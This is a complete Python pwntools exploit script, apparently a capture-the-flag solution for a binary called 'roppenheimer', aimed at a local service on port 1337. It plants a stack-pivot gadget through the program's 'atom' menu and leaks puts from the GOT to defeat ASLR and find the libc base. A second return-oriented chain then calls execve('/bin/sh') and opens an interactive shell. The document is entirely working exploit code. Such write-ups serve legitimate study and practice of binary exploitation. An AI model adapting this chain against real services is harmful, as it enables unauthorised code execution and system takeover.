#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

elf = ELF('../publish/roppenheimer', checksec=False)
libc = ELF('../publish/libc.so.6', checksec=False)

pop_rsp = 0x4025de # pop rax; pop rsp; pop rdi; nop; pop rbp; ret;
pop_rdi = 0x4025e0 # pop rdi; nop; pop rbp; ret;

atoms = {
    0x13371337: 0, 0x0856a093: 0, 0x6643822a: 0, 0x2242f096: 0,
    0x4afdaf79: 0, 0x6dca4a11: 0, 0x2216238a: 0, 0x387bfbc4: 0,
    0x320a7e50: 0, 0x54e2a30e: 0, 0x24f5f5f2: 0, 0x26768099: 0,
    0x3b52fb1e: 0, 0x4b42ec5d: 0, 0x7a425ba8: 0, 0x5ac5eaf9: 0,
    0x02e45def: 0, 0x39fc2f88: 0, 0x0053f705: 0, 0x5a653042: 0,
    0x6a274fcc: 0, 0x453a4ee8: 0, 0x202a01cc: 0, 0x1e6dbb15: 0, 
    0x6e14475f: 0, 0x76edc838: 0, 0x7bafe4a7: 0, 0x6e34859c: 0,
    0x74ebedba: 0, 0x3e3ba094: 0, 0x4273433b: 0, 0x2eec8fa3: 0
}

atoms[0x6e34859c] = pop_rsp
atoms[0x74ebedba] = elf.sym.username


def add_atom(atom, data):
    r.writelineafter(b'choice> ', b'1')
    r.writelineafter(b'atom> ', bytes(str(atom), 'latin'))
    r.writelineafter(b'data> ', bytes(str(data), 'latin'))


def fire_neutron(atom):
    r.writelineafter(b'choice> ', b'2')
    r.writelineafter(b'atom> ', bytes(str(atom), 'latin'))


# r = process('../publish/roppenheimer')
r = remote('localhost', 1337)


chain = flat(
    p64(pop_rdi), p64(elf.got.puts), p64(0),
    p64(elf.sym.puts),
    p64(elf.sym.main)
)

r.writelineafter(b'name> ', b'a'*16 + chain)

for atom in atoms:
    add_atom(atom, atoms[atom])

fire_neutron(0x13371337)


leak = r.readuntil(b'atomic').split(b'\n')[-2]
puts = unpack(leak, 'all')
libc.address = puts - libc.sym.puts

log.info(f'libc @ {hex(libc.address)}')


rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)
rop.call(libc.sym.execve, [next(libc.search(b'/bin/sh')), 0, 0])

r.writelineafter(b'name> ', b'a'*24 + rop.chain())


r.clean()
r.interactive()

